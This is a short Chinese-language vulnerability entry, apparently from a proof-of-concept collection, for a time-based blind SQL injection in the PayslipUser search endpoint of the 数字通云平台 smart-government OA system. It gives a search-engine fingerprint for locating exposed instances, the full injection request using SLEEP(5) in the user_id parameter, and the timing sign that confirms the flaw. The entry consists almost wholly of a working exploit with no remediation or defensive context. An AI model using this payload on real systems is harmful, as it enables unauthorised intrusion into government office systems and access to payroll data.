# 数字通云平台智慧政务OAPayslipUserSQL注入漏洞

数字通云平台智慧政务OAPayslipUser ｜ SQL注入 ｜ —
- **指纹**：`body="assets/8cca19ff/css/bootstrap-yii.css"`
- **请求**：`GET /payslip/search/index/userid/time/time?PayslipUser[user_id]=%28SELECT+4655+FROM+%28SELECT%28SLEEP%285%29%29%29usQE%29 HTTP/1.1`
- **响应特征**：200 响应时间>=5s